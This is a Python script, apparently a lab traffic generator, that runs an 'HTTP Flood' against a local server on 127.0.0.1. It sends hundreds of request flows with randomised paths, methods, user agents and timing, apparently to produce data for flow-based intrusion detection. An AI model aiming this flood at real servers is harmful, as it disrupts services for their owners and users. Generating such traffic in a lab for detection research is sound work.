import requests
import random
import time

TARGET_IP = "127.0.0.1"        # Kali itself — server running here
TARGET_URL = f"http://{TARGET_IP}"
FLOWS = 500
MIN_PACKETS = 5
MAX_PACKETS = 30

HTTP_PATHS = [
    "/", "/index.html", "/home", "/login", "/search",
    "/products", "/api/data", "/images/logo.png",
    "/css/style.css", "/js/app.js", "/contact",
    "/about", "/checkout", "/cart", "/user/profile",
    "/api/v1/users", "/api/v1/products", "/admin",
    "/wp-admin", "/static/main.js",
]

HTTP_METHODS = ["GET", "POST", "HEAD"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/115.0",
    "curl/7.88.1",
    "python-requests/2.28.0",
    "Go-http-client/1.1",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
    "text/html, */*;q=0.8",
]

print(f"[*] Starting HTTP Flood -> {TARGET_URL}")
print(f"[*] Make sure server is running: sudo python3 -m http.server 80")
print(f"[*] Sending {FLOWS} flows x {MIN_PACKETS}-{MAX_PACKETS} requests")

for f in range(FLOWS):
    # --- Flow-level parameters (fixed for entire flow) ---
    method     = random.choice(HTTP_METHODS)
    path       = random.choice(HTTP_PATHS)
    user_agent = random.choice(USER_AGENTS)
    accept     = random.choice(ACCEPT_HEADERS)
    keep_alive = random.choice(["keep-alive", "close"])
    packets    = random.randint(MIN_PACKETS, MAX_PACKETS)

    # Per-flow IAT profile
    iat_min = random.uniform(0.001, 0.01)
    iat_max = random.uniform(iat_min + 0.005, 0.05)

    headers = {
        "User-Agent":      user_agent,
        "Accept":          accept,
        "Accept-Language": "en-US,en;q=0.5",
        "Connection":      keep_alive,
        "Cache-Control":   "no-cache",
    }

    # Use session for keep-alive = real TCP session per flow
    session = requests.Session()

    for p in range(packets):
        try:
            url = f"{TARGET_URL}{path}"

            if method == "POST":
                data = {
                    "data":  random.randint(1000, 9999),
                    "token": random.randint(100000, 999999),
                    "id":    random.randint(1, 65535),
                }
                session.post(url, headers=headers, data=data, timeout=2)

            elif method == "HEAD":
                session.head(url, headers=headers, timeout=2)

            else:
                # GET with random query params for variance
                params = {
                    "q":    random.randint(1, 9999),
                    "page": random.randint(1, 50),
                }
                session.get(url, headers=headers, params=params, timeout=2)

        except Exception:
            pass

        time.sleep(random.uniform(iat_min, iat_max))

    session.close()

    time.sleep(random.uniform(0.01, 0.05))

    if (f + 1) % 20 == 0:
        print(f"[+] {f + 1}/{FLOWS} flows sent")

print("[*] Done.")